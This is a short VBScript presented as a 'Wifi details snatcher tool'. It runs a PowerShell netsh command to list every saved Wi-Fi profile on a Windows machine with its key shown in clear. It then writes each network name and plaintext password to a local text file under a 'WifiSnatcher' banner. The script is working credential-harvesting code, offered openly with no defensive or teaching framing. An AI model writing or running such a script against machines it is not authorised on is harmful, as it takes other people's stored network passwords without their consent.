'Wifi details snatcher tool
Option Explicit

Dim objShell,objFso,objExec,objFile,strOutput,strLine
Dim wifiName, wifiPassword,command

' Create a shell object
Set objShell = CreateObject("WScript.Shell")
'Create Fso object
Set objFso = CreateObject("Scripting.FileSystemObject")
' Create file object
Set objFile =objFso.CreateTextFile("WifiDetails.txt",True)
command="powershell.exe -Command ""netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace 'All User Profile     : ', ''; netsh wlan show profile name=''$(($_ -replace '.*: ', ''))'' key=clear }"""

Set objExec=objShell.Exec(command)
objFile.Writeline "         WifiSnatcher           "
objFile.Writeline "================================"
objFile.Writeline "                          -TEdtr"

' Read the output from the command
strOutput = ""
Do While Not objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    strOutput = strOutput & strLine & vbCrLf


    If InStr(strLine, "SSID name")>0  Then
        ' Extract the Wi-Fi name
        wifiName = Trim(Split(strLine, ":")(1))
    
     ' Output the Wi-Fi name and password
        objFile.Writeline "Wi-Fi Name: " & wifiName
   End If

        If InStr(strLine, "Key Content") > 0 Then
        ' Extract the Wi-Fi password
        wifiPassword = Trim(Split(strLine, ":")(1))
  
        objFile.Writeline "Password: " & wifiPassword
        objFile.Writeline "-------------------------"
    
    
       
   End If


Loop




 

' Clean up
Set objExec = Nothing
Set objShell = Nothing

'-TEdtr